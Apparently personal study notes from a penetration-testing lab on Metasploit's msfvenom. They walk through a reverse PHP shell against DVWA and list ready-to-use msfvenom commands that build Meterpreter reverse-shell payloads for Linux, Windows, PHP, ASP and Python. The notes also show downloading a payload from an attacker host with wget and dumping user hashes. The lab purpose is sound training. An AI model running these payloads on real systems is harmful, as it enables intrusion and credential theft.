Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.)
![[Pasted image 20240815200512.png]]

### Output formats
You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The `msfvenom --list formats` command can be used to list supported output formats.

### Encoders
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

![[Pasted image 20240815201242.png]]

### Handlers
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;
1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell  

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.
![[Pasted image 20240815201417.png]]

*Note:*
	The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below:
![[Pasted image 20240815201517.png]]

The reverse_shell.php file should be edited to convert it into a working PHP file. 
Below: Comments removed from the beginning of the file // end tag added.
![[Pasted image 20240815201603.png]]
![[Pasted image 20240815201632.png]]

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command. Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells. To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
![[Pasted image 20240815201802.png]]

Once everything is set, we will `run` the handler and wait for the incoming connection.
![[Pasted image 20240815201819.png]]

Note:
	When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell. If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

### Other Payloads
Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen. Below are a few examples you will often use:

**Linux Executable and Linkable Format (elf)**  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  

The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
**Windows**  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
**PHP**  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
**ASP**  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
**Python**  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`


## Examples
1) Create a meterpreter payload in the .elf format 
![[Pasted image 20240815204009.png]]

2) Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget `http://ATTACKING_MACHINE_IP:9000/shell.elf` to download it to the target machine)
![[Pasted image 20240815204155.png]]

3) Get a meterpreter session on the target machine
![[Pasted image 20240815204419.png]]
![[Pasted image 20240815204439.png]]
![[Pasted image 20240815204600.png]]

4) Use a post exploitation module to dump hashes of other users on the system.
![[Pasted image 20240815204656.png]]

